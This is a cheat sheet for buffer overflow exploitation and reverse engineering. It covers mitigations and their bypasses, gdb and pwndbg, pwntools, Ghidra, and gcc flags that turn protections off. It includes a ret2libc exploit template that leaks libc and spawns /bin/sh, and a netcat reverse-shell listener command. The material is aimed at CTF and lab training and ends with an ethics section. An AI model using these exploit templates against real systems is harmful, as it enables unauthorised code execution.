# BUFFER OVERFLOW / PWN / REVERSING COMPLETE CHEAT SHEET

## 1. WHAT IS BUFFER OVERFLOW?

A **Buffer Overflow** occurs when a program writes more data to a buffer than it can hold, overwriting adjacent memory. In exploit development it is used to:

- **Hijack the instruction pointer** (EIP/RIP) to redirect execution
- **Achieve Remote Code Execution (RCE)**
- **Bypass authentication** or escalate privileges
- **Leak memory** (info disclosure) to defeat ASLR/PIE
- **Build ROP chains** when NX/DEP is enabled

**Key fact:** Modern mitigations (ASLR, PIE, NX, canaries, RELRO) make exploitation harder but not impossible — you need the right techniques per scenario.

---

## 2. COMMON MITIGATIONS

| Mitigation | Description | Bypass |
|-----------|-------------|--------|
| **NX / DEP** | Stack not executable | ROP, ret2libc |
| **ASLR** | Randomizes base addresses | Info leak, brute-force (32-bit) |
| **PIE** | Binary base randomized | Info leak |
| **Stack Canary** | Detects stack corruption | Leak canary, overwrite via off-by-one |
| **FORTIFY_SOURCE** | Safer libc functions | Find unprotected calls |
| **RELRO** | GOT protection | Partial: overwrite GOT; Full: not GOT |
| **SafeSEH / SEHOP** (Win) | SEH protection | Bypass via pop-pop-ret |

**Check mitigations:**
```bash
checksec --file=./vuln
readelf -h ./vuln
readelf -l ./vuln | grep GNU_STACK
readelf -d ./vuln | grep BIND_NOW
```

---

## 3. GDB — INTERACTIVE DEBUGGER

### 3.1 Basic Session
```bash
gdb -q ./vuln
(gdb) file ./vuln
(gdb) set disassembly-flavor intel
(gdb) break main
(gdb) run
```

### 3.2 Inspecting After Crash
```bash
(gdb) info registers
(gdb) x/32wx $rsp
(gdb) x/s 0x7fffffffe220
(gdb) disas $rip-32,$rip+128
(gdb) bt
```

### 3.3 Useful Options
```bash
(gdb) set follow-fork-mode child
(gdb) set pagination off
(gdb) set logging on
```

---

## 4. PWNDBG / GEF / PEDA — GDB EXTENSIONS

### 4.1 Install pwndbg
```bash
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

### 4.2 Commands (inside gdb)
```bash
(gdb) context          # registers / stack / asm / source
(gdb) vmmap            # memory map
(gdb) got              # GOT entries (pwndbg)
(gdb) checksec         # mitigations
(gdb) heap             # heap view
(gdb) bin              # bins view
(gdb) rop              # search for rop gadgets
```

---

## 5. PWNTOOLS — AUTOMATION LIBRARY

### 5.1 Install
```bash
pip install pwntools
```

### 5.2 Typical Template
```python
from pwn import *

context.binary = elf = ELF('./vuln')
context.log_level = 'debug'

p = process('./vuln')            # or remote('host', 31337)

payload  = b'A' * 136
payload += p64(0x401020)

p.sendline(payload)
p.interactive()
```

### 5.3 Offset Discovery
```python
from pwn import *
p = process('./vuln')
p.sendline(cyclic(300))
p.wait()
# Check RIP/EIP in gdb
cyclic_find(0x61616162)   # returns offset
```

### 5.4 Other Utilities
```python
ELF('./vuln').symbols
ELF('./vuln').got
ELF('./vuln').plt
ROP(elf)
ROP(elf).find_gadget(['pop rdi', 'ret'])
flat([...])                # pack & concatenate
p64(x) / p32(x)            # pack addresses
u64(x) / u32(x)            # unpack
remote('host', port)
```

---

## 6. GHIDRA — STATIC ANALYSIS

### 6.1 Workflow
1. Open binary → wait for auto-analysis.
2. Go to `Functions` → open `main` and handlers.
3. Use the **Decompiler** panel (right) for pseudo-C.
4. Look for `puts(buffer)`, `printf(user_input)`, or unfiltered reads.

### 6.2 Tips
- **Search → For Strings** to find messages / leaks.
- **Xrefs** to see who calls a function.
- **Data Type Manager** to define structs.
- **Symbol Tree** for imported functions.

---

## 7. GCC — COMPILING VULNERABLE BINARIES

```bash
# Debug symbols
gcc -g vuln.c -o vuln

# 32-bit, no canary, exec stack, no PIE
gcc -m32 vuln.c -o vuln32 -fno-stack-protector -z execstack -no-pie

# 64-bit, no canary, no PIE
gcc -m64 vuln.c -o vuln64 -fno-stack-protector -no-pie

# AddressSanitizer for detection
gcc -g vuln.c -fsanitize=address -o vuln_asan

# Static binary
gcc -static vuln.c -o vuln_static

# With debug + all protections enabled
gcc -g -O2 -fstack-protector-all -pie -fPIE vuln.c -o vuln_hardened
```

**Flags explained:**
- `-fno-stack-protector` → removes canaries
- `-no-pie` / `-fno-pie` → fixed addresses
- `-z execstack` → executable stack (lab only)
- `-m32` / `-m64` → architecture
- `-fsanitize=address` → ASan for debugging

---

## 8. QEMU — CROSS-ARCHITECTURE EMULATION

```bash
# Run ARM binary on x86 host
qemu-arm -L /usr/arm-linux-gnueabi ./vuln_arm

# Debug with gdb
qemu-arm -g 1234 ./vuln_arm
# Another terminal:
gdb-multiarch ./vuln_arm
(gdb) target remote :1234
```

**Tips:**
- Use `gdb-multiarch` or `lldb` with multi-arch support.
- Install cross-libs: `apt install qemu-user libc6-armhf-cross`.

---

## 9. WINDOWS DEBUGGERS

### 9.1 x64dbg
- GUI debugger for x86/x64.
- Workflow: open EXE → strings → breakpoints on imports (`recv`, `gets`) → inspect stack/heap.
- Useful: memory map, stack trace, plugin ecosystem.

### 9.2 OllyDbg
- Classic 32-bit debugger (legacy).
- Good for binaries without symbols and quick patching.

### 9.3 Immunity Debugger
- Windows debugger with Python scripting.
- Plugins: `mona.py` for offsets, badchars, ROP, SEH.

### 9.4 WinDbg / WinDbg Preview
- Advanced Windows debugging (user + kernel).
- Crash dump analysis.

```windbg
!analyze -v      # auto crash analysis
k                # stack trace
lm               # loaded modules
dt _PEB          # PEB structure
```

---

## 10. AUXILIARY COMMANDS

```bash
readelf -a ./vuln           # ELF headers
readelf -h ./vuln           # ELF header
readelf -s ./vuln           # symbols
objdump -d ./vuln | less    # disassembly
objdump -M intel -d ./vuln  # Intel syntax
nm -D ./vuln                # dynamic symbols
strings ./vuln | grep -i flag
checksec --file=./vuln
gdbserver :1234 ./vuln      # remote gdb
nc -lvnp 4444               # listen for reverse shell
ltrace ./vuln               # trace library calls
strace ./vuln               # trace system calls
```

---

## 11. ROP / RET2LIBC TOOLING

```bash
# ROPgadget
ROPgadget --binary ./vuln | grep "pop rdi"
ROPgadget --binary ./vuln --only "pop|ret"

# ropper
ropper --file ./vuln --search "pop rdi"
ropper --file ./vuln --chain "execve"

# one_gadget (libc)
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# Find offsets
readelf -s libc.so.6 | grep " system"
readelf -s libc.so.6 | grep " /bin/sh"
strings -a -t x libc.so.6 | grep "/bin/sh"
```

**Ret2libc template:**
```python
from pwn import *
elf = ELF('./vuln')
libc = ELF('./libc.so.6')
p = process('./vuln')

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

payload  = b'A' * offset
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

p.sendline(payload)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = leak - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh  = libc_base + next(libc.search(b'/bin/sh'))

payload2  = b'A' * offset
payload2 += p64(ret)
payload2 += p64(pop_rdi) + p64(binsh)
payload2 += p64(system)
p.sendline(payload2)
p.interactive()
```

---

## 12. QUICK WORKFLOW (TYPICAL BUFFER OVERFLOW)

```
1) Analyze binary
   $ file ./vuln
   $ checksec --file=./vuln
   $ strings ./vuln

2) Crash in gdb
   $ gdb -q ./vuln
   (gdb) run <<< $(python3 -c "print('A'*300)")
   (gdb) info registers      # look at RIP/EIP

3) Find offset
   $ python3 -c "from pwn import *; print(cyclic(300))" | ./vuln
   >>> cyclic_find(0x61616162)

4) Build minimal payload
   payload = b'A'*offset + p64(ret_address)

5) If NX enabled → ROP / ret2libc
   - Use ROPgadget / ropper
   - Leak libc with puts/printf
   - Compute base and jump to system("/bin/sh")

6) If canary present → leak canary first
   - Use format string or off-by-one
```

---

## 13. TIPS FOR TESTING

1. Always run `checksec` first — mitigations dictate the strategy.
2. Use `cyclic` to find offsets, never guess.
3. Enable `set disassembly-flavor intel` in gdb for readability.
4. Use pwndbg/GEF for faster triage (`context` after crash).
5. Combine Ghidra (static) + gdb (dynamic) for full picture.
6. For cross-arch, always use `gdb-multiarch`.
7. If ASLR is on but binary is not PIE, ROP inside binary still works.
8. For 32-bit with ASLR, brute-force is often feasible (~1/256).
9. Use `one_gadget` for quick shell when you control RIP.
10. Test only on your own VMs, isolated labs, or authorized CTFs.

---

## 14. ETHICS AND SAFETY

- Practice **only** on VMs, isolated environments, or CTF platforms.
- Never exploit services in production or third-party machines.
- Document findings and follow responsible disclosure.
- Use sanitized snapshots before running unknown binaries.
